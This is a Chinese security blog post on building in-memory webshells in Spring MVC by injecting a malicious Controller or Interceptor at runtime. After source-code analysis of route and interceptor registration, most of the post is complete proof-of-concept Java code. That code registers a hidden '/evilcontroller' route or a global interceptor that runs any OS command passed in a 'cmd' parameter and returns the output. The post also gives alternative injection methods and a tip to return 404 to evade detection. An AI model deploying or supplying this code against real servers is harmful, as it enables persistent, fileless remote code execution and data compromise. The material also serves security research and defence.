---
title: "spring内存马——Controller&Interceptor"
onlyTitle: true
date: 2022-12-29 13:05:36
categories:
- java
- 内存马
tags:
- Spring
- 内存马
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B831.png

---

# Spring内存马

Spring是IOC和AOP的容器框架，SpringMVC则是基于Spring功能的Web框架。

* IOC容器：IOC容器负责实例化、定位、配置应用程序对象及建立对象依赖。Spring中用BeanFactory实现

* Spring作为Java框架，核心组件有三个：Core、Context、Bean。其中context又叫IOC容器；Bean构成应用程序主干，Bean就是对象，由IOC容器统一管理；Core为处理对象间关系的方法

> 依赖注入：把有依赖关系的类放到容器中，解析出这些类的实例

spring对象间的依赖关系可以用配置文件的`<bean>`定义。context的顶级父类ApplicationContext继承了BeanFactory。

内存马一般的构造方式就是模拟组件注册，注入恶意组件

## springMVC环境搭建

新建maven项目，项目名右键添加web框架

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113155144100.png)

配置tomcat：设置tomcat主目录以及Application context路径

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113155425594.png)

pom.xml里加入sping MVC5.3.21以及其他依赖

```xml
<dependencies>
        <!-- SpringMVC -->
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-webmvc</artifactId>
            <version>5.3.21</version>
        </dependency>

        <!-- 日志 -->
        <dependency>
            <groupId>ch.qos.logback</groupId>
            <artifactId>logback-classic</artifactId>
            <version>1.2.3</version>
        </dependency>

        <!-- ServletAPI -->
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>javax.servlet-api</artifactId>
            <version>3.1.0</version>
            <scope>provided</scope>
        </dependency>

        <!-- Spring5和Thymeleaf整合包 -->
        <dependency>
            <groupId>org.thymeleaf</groupId>
            <artifactId>thymeleaf-spring5</artifactId>
            <version>3.0.12.RELEASE</version>
        </dependency>
    </dependencies>

```

在web.xml中添加DispatcherServlet。DispatcherServlet的主要作用将web请求，根据配置的URL pattern，将请求分发给Controller和View。

```xml
<servlet>
        <servlet-name>DispatcherServlet</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <init-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>classpath:SpringMVC.xml</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>
    <servlet-mapping>
        <servlet-name>DispatcherServlet</servlet-name>
        <url-pattern>/</url-pattern>
    </servlet-mapping>
<listener>
        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
    </listener>

```

在classpath，我这里是src/main/resources下创建SpringMVC.xml核心配置文件

创建TestController类：

```java
package org.example.springmvc;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class TestController {
    @RequestMapping("/index")
    public String index(){
        return "index";
    }
}
```

修改SpringMVC.xml。这里sping会自动扫描base-package下的java文件，如果文件中有@Service,@Component,@Repository,@Controller等这些注解的类，则把这些类注册为bean 

> 属性use-default-filters=”false”表示不要使用默认的过滤器

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:context="http://www.springframework.org/schema/context"
       xmlns:mvc="http://www.springframework.org/schema/mvc"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"

       xsi:schemaLocation="
        http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
        http://www.springframework.org/schema/context
        http://www.springframework.org/schema/context/spring-context-3.0.xsd
        http://www.springframework.org/schema/mvc
        http://www.springframework.org/schema/mvc/spring-mvc-4.3.xsd">

    <mvc:annotation-driven/>
    <context:component-scan base-package="org.example.springmvc" />

    <bean
            class="org.springframework.web.servlet.view.InternalResourceViewResolver">
        <property name="prefix">
            <value>/WEB-INF/</value>
        </property>
        <property name="suffix">
            <value>.jsp</value>
        </property>
    </bean>
</beans>

```

prefix表示路径，suffix指定后缀

在WEB-INF下创建lib目录，将可用库全部拖进去

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113164444077.png)

当访问index时，返回index，根据SpringMVC.xml配置的prefix，去`/WEB-INF/`下寻找jsp后缀的文件。

比如在/WEB-INF/下存放index.jsp，访问index时会通过web.xml中导入的DispatcherServlet处理请求，DispatcherServlet发送到Controller注解类，也就是TestController# return index。然后由springMVC视图解析器去/WEB-INF/下寻找index且为jsp后缀的文件。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113171242640.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113171325985.png)

其实如果嫌配置麻烦，可以直接使用springboot。然后直接写Controller

```xml
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>2.4.5</version>
    <relativePath/> <!-- lookup parent from repository -->
</parent>
```



## 基础知识

### controller

Controller负责处理DispatcherServlet分发的请求。将用户请求处理后封装成model返回给view。

在springmvc中用@Controller标记一个类为Controller。然后用@RequestMapping等来定义URL请求和Controller方法间的映射

### ApplicationContext

org.springframework.context.ApplicationContext接口代表了IoC容器，该接口继承了BeanFactory接口。

### ContextLoaderListener

用来初始化全局唯一的Root Context，也就是Root WebApplicationContext.该WebApplicationContext和其他子Context共享IOC容器，共享bean

访问和操作bean就需要获得当前环境ApplicationContext



##  源码分析

在Controller类打上断点，然后访问index

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230114193108680.png)

### Controller的注册

在DoDispatch处由DispatcherServlet处理web请求

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115130044552.png)

在DispatcherServlet调用HandlerAdapter#handle处理request和response。并且此处用getHandler方法获取了mappedHandler的Handler

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115130226761.png)

往上看，mappedHandler是对handlerMappings进行遍历。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115132840301.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115132941964.png)

持续跟进mapping.getHandler(request)发现，AbstractHandlerMethodMapping#getHandlerInternal()中对mappingRegistry进行上锁，最后解锁。（不自觉想起了死锁）mappingRegistry存储了路由信息。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115133306441.png)

在lookupHandlerMethod方法，从mappingRegistry中获取了路由

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115133835103.png)

也就是说模拟注册向mappingRegistry中添加内存马路由，就能注入内存马。

在AbstractHandlerMethodMapping中就提供了registryMapping添加路由。但是该类为抽象类。它的子类RequestMappingHandlerMapping能进行实例化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115134351643.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115134525368.png)

### RequestMappingHandlerMapping分析

AbstractHandlerMethodMapping的afterProperties用于bean初始化

initHandlerMethod()遍历所有bean传入processCandidateBean处理bean，也就是controller

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115142726301.png)

在processCandidateBean中，getType获取bean类型，通过isHandler进行类型判断，如果bean有controller或RequestMapping注解，就进入detectHandlerMethods解析bean

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115143202340.png)

在detectHandlerMethods中，用getMappingForMethod创建RequestMappingInfo

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115144613123.png)

处理完后用registryHandlerMethod建立方法到RequestyMappingInfo的映射。也就是注册路由

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115145218392.png)



#### mappingRegistry路由信息

registry传入的参数mapping,handler,method。mapping存储了方法映射的URL路径。handler为controller对象。method为反射获取的方法

## Controller内存马构造

### 1.获取WebApplicationContext

在内存马的构造中，都会获取容器的context对象。在Tomcat中获取的是StandardContext，spring中获取的是`WebApplicationContext`。（在controller类声明处打上断点可以看到初始化`WebApplicationContext`的过程）WebApplicationContext继承了BeanFactory，所以能用getBean直接获取RequestMappingHandlerMapping，进而注册路由。

所以重点是如何获取WebApplicationContext



* 原理：

* 获取WebApplicationContext:

  由于webApplicationContext对象存放于servletContext中。并且键值为`WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE`

  所以可以直接用servletContext#getAttribute()获取属性值

  

  ```java
  WebApplicationContext wac = (WebApplicationContext)servletContext.getAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE);
  ```

  webApplicationContextUtils提供了下面两种方法获取webApplicationContext。需要传入servletContext

  ```java
  WebApplicationContextUtils.getRequeiredWebApplicationContext(ServletContext s);
  WebApplicationContextUtils.getWebApplicationContext(ServletContext s);
  ```

  > spring 5的WebApplicationContextUtils已经没有getWebApplicationContext方法

* 获取ServletContext

  通过request对象或者ContextLoader获取ServletContext

  ```java
  // 1
  ServletContext servletContext = request.getServletContext();
  // 2
  ServletContext servletContext = ContextLoader.getCurrentWebApplicationContext().getServletContext();
  ```

* 获取request可以用RequestContextHolder

  ```java
  HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder
          .getRequestAttributes()).getRequest();
  ```





spring中获取context的方式一般有以下几种

①直接通过ContextLoader获取，不用再经过servletContext。不过ContextLoader一般会被ban

```java
WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
```

②通过RequestContextHolder获取request，然后获取servletRequest后通过RequestContextUtils得到WebApplicationContext

```java
WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
```

③用RequestContextHolder直接从键值org.springframework.web.servlet.DispatcherServlet.CONTEXT中获取Context

```java
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```

④直接反射获取WebApplicationContext

```java
java.lang.reflect.Field filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
filed.setAccessible(true);
org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();
```

实际上常用的就2,3。



其中1获取的是Root WebApplicationContext，2，3通过RequestContextUtils获取的是叫dispatcherServlet-servlet的Child WebApplicationContext。

> 在有些Spring 应用逻辑比较简单的情况下，可能没有配置 `ContextLoaderListener` 、也没有类似 `applicationContext.xml` 的全局配置文件，只有简单的 `servlet` 配置文件，这时候通过1方法是获取不到`Root WebApplicationContext`的。





### 2.模拟注册Controller

在spring2.5-3.1使用DefaultAnnotationHandlerMapping处理URL映射。spring3.1以后使用RequestMappingHandlerMapping

模拟注册Controller的方式一般有三种：

①源码分析就介绍的，registryMapping直接注册requestMapping

直接通过getBean就能获取RequestMappingHandlerMapping

```java
RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
```

生成RequestMappingInfo。需要传入PatternsRequestCondition（Controller映射的URL）和RequestMethodsRequestCondition（HTTP请求方法）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116132821455.png)

```java
PatternsRequestCondition url = new PatternsRequestCondition("/evilcontroller");

RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();

RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);

```

恶意Controller:

```java
@RestController
public class InjectedController {
    public InjectedController(){
    }
    public void cmd() throws Exception {
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        if (request.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            response.getWriter().write(output);
            response.getWriter().flush();
            response.getWriter().close();
    }
}
```

反射获取shell方法

```java
Method method = InjectedController.class.getMethod("cmd");
```

调用ReqgistryMapping注册

```java
requestMappingHandlerMapping.registerMapping(info, injectedController, method);
```

### 测试：

* 完整代码

```java
package org.example.springmvc;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.util.Scanner;

@RestController
public class InjectController {
    @RequestMapping("/inject")
    public String inject() throws Exception{
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

        Method method = InjectedController.class.getMethod("cmd");

        PatternsRequestCondition url = new PatternsRequestCondition("/evilcontroller");

        RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();

        RequestMappingInfo info = new RequestMappingInfo(url, condition, null, null, null, null, null);

        InjectedController injectedController = new InjectedController();

        requestMappingHandlerMapping.registerMapping(info, injectedController, method);

        return "Inject done";
    }

    @RestController
    public class InjectedController {
        public InjectedController(){
        }
        public void cmd() throws Exception {
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
                response.getWriter().close();
            }
        }
    }
}

```





先访问Inject进行controller注册。然后访问controller映射路径evilcontroller，带上参数就能RCE



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116134710299.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116134914576.png)



除此以外，还有两种方式能模拟注册Controller

②detectHandlerMethods直接注册

上面指出：在detectHandlerMethods中，用getMappingForMethod创建RequestMappingInfo

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115144613123.png)

该方法接收handler参数，就能寻找到bean并注册controller

```java
//1.在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("org.example.springmvc.InjectedController").newInstance());
// 2. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);
// 3. 反射获得 detectHandlerMethods Method
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);
m1.setAccessible(true);
//4.将 dynamicController 注册到 handlerMap 中
m1.invoke(requestMappingHandlerMapping, "dynamicController");
```





③利用registerHandler

上面的方法适用于spring3.1后RequestMappingHandlerMapping为映射器。当用DefaultAnnotationHandlerMapping为映射器时。该类顶层父类的registerHandler接收urlPath参数和handler参数来注册controller。不过不常用了，贴一下利用方法：

```java
// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("org.example.springmvc.InjectedController").newInstance());
// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);
// 3. 反射获得 registerHandler Method
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod("registerHandler", String.class, Object.class);
m1.setAccessible(true);
// 4. 将 dynamicController 和 URL 注册到 handlerMap 中
m1.invoke(dh, "/favicon", "dynamicController");
```

还可以加个else不带参数时返回404状态码，减少被检测到的概率



## Interceptor拦截器内存马构造

Interceptor和Tomcat和Filter过滤器很类似。区别如下：

1. Interceptor基于反射，Filter基于函数回调
2. Interceptor不依赖servlet容器
3. Interceptor只能对action请求有用
4. Interceptor可以访问action上下文，栈里的对象。Filter不能
5. action生命周期中，Interceptor可以被多次调用，Filter只在容器初始化时调用一次
6. Interceptor可以获取IOC容器中的bean，Filter不行

由以上区别，Interceptor的应用和过滤器也就不同，Interceptor用来做日志记录，过滤器用来过滤非法操作



#### 源码分析

DispatcherServlet.doDispatch中，进行了getHandler，持续跟进发现最终调用的是AbstractHandlerMapping#getHandler()，该方法中调用了getHandlerExecutionChain()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116151435756.png)

该方法从adaptedInterceptors中把符合的拦截器添加到chain里。adaptedInterceptors就存放了全部拦截器

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116151607398.png)

返回到DispatcherServlet#doDispatch()，getHandler后执行了applyPreHandle遍历执行了拦截器。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116152125751.png)



而且可以看到applyPreHandle后面就是ha.handle()，执行controller，所以说Interceptors是在controller之前执行的



师傅给出了Filter,controller,Interceptors执行的顺序：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116152540872.png)

- preHandle( )：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。
- postHandle( )：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。
- afterCompletion( )：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。

### 1. 获取RequestMappingHandlerMapping

因为是在AbstractHandlerMapping类中，用addInterceptor向拦截器chain中添加的。该类是抽象类，可以获取其实现类RequestMappingHandlerMapping。一样的，前面提了四种方法。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116152954118.png)

```java
WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

```

### 2.反射获取adaptedInterceptors

获取adaptedInterceptors，private属性，使用反射。并且传入RequestMappingHandlerMapping初始化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116153445849.png)

```java
    Field field = null;
    try {
        field = RequestMappingHandlerMapping.class.getDeclaredField("adaptedInterceptors");
    } catch (NoSuchFieldException e) {
        e.printStackTrace();
    }
    field.setAccessible(true);
    List<HandlerInterceptor> adaptInterceptors = null;
    try {
        adaptInterceptors = (List<HandlerInterceptor>) field.get(mappingHandlerMapping);
    } catch (IllegalAccessException e) {
        e.printStackTrace();
    }
```

### 3.添加恶意Interceptors

```java
adaptInterceptors.add(new InjectEvilInterceptor("a"));
```

恶意Interceptor:需要实现HandlerInterceptor接口，通过重写preHandle进行RCE

```java
public class InjectInterceptor implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        if (request.getParameter("cmd") != null) {
            try{
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
                response.getWriter().close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return false;
        }
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
    }
}
```



### 测试：

过滤器和controller可以直接使用@RequestMapping注解进行URL映射。拦截器Interceptor需要手动编写一个Config添加进去，或者直接修改配置文件spingmvc.xml

```xml
    <mvc:interceptors>
        <mvc:interceptor>
            <mvc:mapping path="/**"/>
            <bean class="org.example.InjectInterceptor"></bean>
        </mvc:interceptor>
    </mvc:interceptors>

```



POC：

```java
package org.example.springmvc;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Scanner;

public class InjectInterceptor implements HandlerInterceptor {
    static {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Field field = null;
        try {
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        field.setAccessible(true);
        List<HandlerInterceptor> adaptInterceptors = null;
        try {
            adaptInterceptors = (List<HandlerInterceptor>) field.get(mappingHandlerMapping);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        InjectInterceptor evilInterceptor = new InjectInterceptor();
        adaptInterceptors.add(evilInterceptor);
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        if (request.getParameter("cmd") != null) {
            try{
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
                response.getWriter().close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return false;
        }
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
    }
}

```

新建一个controller触发拦截器，作为入口

```java
package org.example.springmvc;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@Controller
@RequestMapping("/InjectInterceptor")
public class EvilController {
    @GetMapping
    public void index(HttpServletRequest request, HttpServletResponse response) {
        try {
            Class.forName("org.example.springmvc.InjectInterceptor");
            response.getWriter().println("Inject done!");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```





![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116171335538.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116171353734.png)





参考：https://ho1aas.blog.csdn.net/article/details/123943546

https://www.freebuf.com/articles/web/327633.html

https://landgrey.me/blog/12/

